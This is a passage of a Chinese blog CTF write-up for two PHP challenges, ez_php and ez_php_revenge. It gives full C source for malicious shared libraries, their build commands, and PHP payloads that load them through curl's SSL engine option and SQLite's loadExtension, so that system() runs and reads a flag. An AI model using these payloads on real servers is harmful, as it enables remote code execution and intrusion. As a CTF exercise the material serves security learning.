+<p><img src="/images/CTF/so/so8.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+>
+没招了，在最后一步打扩展的时候失败了，正常的话应该是可以打的才对，很奇怪啊。报错这些是正确输入，就，挺离谱的。
+服务器起了一个docker搞，这个是没有设置curl过滤的，简单拿下。
+<img src="/images/CTF/so/so9.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+>
+然后下面是有curl过滤的，困难了一点，但是不多。
+<img src="/images/CTF/so/so10.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+>
+总结一下这两个题目的思路和最终的payload吧。</p>
+<ol>
+<li>首先都是要上传so文件的，这里基本上就是将.so文件base64编码之后上传再解码，大多数RCE场景获取二进制文件的通用方法，说实话有点像序列化的传递方式。</li>
+<li>第二步就是通过不同的加载方式，将so加载进去，然后进行RCE的利用，这个操作可以理解为发生在服务器内部，不受PHP的影响，所以可以去执行system，或者是一些其他的命令等等。</li>
+</ol>
+<p>payload如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">ez_php</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span><span class="nx">c</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdlib.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">__attribute__</span><span class="p">((</span><span class="nx">constructor</span><span class="p">))</span> <span class="k">static</span> <span class="nx">void</span> <span class="nx">rce_init</span><span class="p">(</span><span class="nx">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat /texun &gt; /var/www/html/1.txt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">gcc</span> <span class="o">-</span><span class="nx">fPIC</span> <span class="o">-</span><span class="nx">shared</span> <span class="o">-</span><span class="nx">o</span> <span class="mf">1.</span><span class="nx">so</span> <span class="mf">1.</span><span class="nx">c</span>
+</span></span><span class="line"><span class="cl"><span class="nx">base64</span> <span class="o">-</span><span class="nx">w</span> <span class="mi">0</span> <span class="mf">1.</span><span class="nx">so</span> <span class="o">&gt;</span> <span class="mf">1.</span><span class="nx">so</span><span class="o">.</span><span class="nx">b64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">payload</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$malicious_so_path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/1.so&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="s2">&#34;&lt;http://127.0.0.1&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_SSLENGINE</span><span class="p">,</span> <span class="nv">$malicious_so_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL编码后传参</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ez_php_revenge</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">exploit</span><span class="o">.</span><span class="nx">c</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;sqlite3ext.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdlib.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1">#include &lt;string.h&gt;
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">SQLITE_EXTENSION_INIT1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#ifdef _WIN32
+</span></span></span><span class="line"><span class="cl"><span class="nx">__declspec</span><span class="p">(</span><span class="nx">dllexport</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#endif
+</span></span></span><span class="line"><span class="cl"><span class="nx">int</span> <span class="nx">sqlite3_exploit_init</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">sqlite3</span> <span class="o">*</span><span class="nx">db</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">char</span> <span class="o">**</span><span class="nx">pzErrMsg</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">sqlite3_api_routines</span> <span class="o">*</span><span class="nx">pApi</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">SQLITE_EXTENSION_INIT2</span><span class="p">(</span><span class="nx">pApi</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">char</span> <span class="o">*</span><span class="nx">command_file_path</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/1.txt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">char</span> <span class="nx">command_buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">FILE</span> <span class="o">*</span><span class="nx">file_handle</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">file_handle</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nx">command_file_path</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_handle</span> <span class="o">==</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">SQLITE_OK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">fgets</span><span class="p">(</span><span class="nx">command_buffer</span><span class="p">,</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nx">command_buffer</span><span class="p">),</span> <span class="nx">file_handle</span><span class="p">)</span> <span class="o">!=</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">command_buffer</span><span class="p">[</span><span class="nx">strcspn</span><span class="p">(</span><span class="nx">command_buffer</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nx">command_buffer</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">system</span><span class="p">(</span><span class="nx">command_buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nx">file_handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">SQLITE_OK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">gcc</span> <span class="o">-</span><span class="nx">fPIC</span> <span class="o">-</span><span class="nx">shared</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">exploit</span><span class="o">.</span><span class="nx">so</span> <span class="nx">exploit</span><span class="o">.</span><span class="nx">c</span> <span class="o">-</span><span class="nx">lsqlite3</span>
+</span></span><span class="line"><span class="cl"><span class="nx">base64</span> <span class="o">-</span><span class="nx">w</span> <span class="mi">0</span> <span class="nx">exploit</span><span class="o">.</span><span class="nx">so</span> <span class="o">&gt;</span> <span class="nx">exploit</span><span class="o">.</span><span class="nx">so</span><span class="o">.</span><span class="nx">b64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">payload</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;/var/www/html/1.txt&#34;</span><span class="p">,</span><span class="s2">&#34;cat /texun &gt; /var/www/html/2.txt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Pdo\Sqlite</span><span class="p">(</span><span class="s1">&#39;sqlite::memory:&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">loadExtension</span><span class="p">(</span><span class="s1">&#39;/var/www/html/exploit.so&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/var/www/html/2.txt&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>完事。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/serialize/serialize1.png" loading="lazy" data-key="" data-hash="/images/TOP10/serialize/serialize1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP反序列化整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/rce%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/RCE/rce1.png" loading="lazy" data-key="" data-hash="/images/TOP10/RCE/rce1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RCE整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ssti%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/SSTI/ssti1.png" loading="lazy" data-key="" data-hash="/images/TOP10/SSTI/ssti1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SSTI整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/sql%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/SQL/sql1.png" loading="lazy" data-key="" data-hash="/images/TOP10/SQL/sql1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ssrf%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/SSRF/ssrf1.png" loading="lazy" data-key="" data-hash="/images/TOP10/SSRF/ssrf1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SSRF整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 xxxx
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.33.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+    
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
